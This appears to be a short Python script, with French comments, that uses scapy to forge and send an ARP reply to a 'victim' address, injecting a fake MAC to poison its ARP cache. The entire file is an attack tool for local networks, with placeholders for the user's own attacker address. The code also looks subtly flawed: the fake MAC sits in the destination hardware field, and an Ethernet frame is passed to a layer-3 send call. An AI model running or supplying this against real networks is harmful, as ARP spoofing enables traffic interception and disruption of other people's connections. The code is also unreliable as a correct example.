
from scapy.all import ARP, Ether, send

# Adresse IP de la victime
victim_ip = "10.13.33.37"
# Adresse MAC à injecter
fake_mac = "de:ad:be:ef:ca:fe"
# Adresse IP de l'attaquant (celui qui envoie la trame)
attacker_ip = "10.13.33.1"  # Remplacez par l'adresse IP de votre machine

# Création de la trame ARP
arp_response = ARP(op=2, pdst=victim_ip, psrc=attacker_ip, hwdst=fake_mac)
ether = Ether(dst=fake_mac) / arp_response

# Envoi de la trame
send(ether, verbose=0)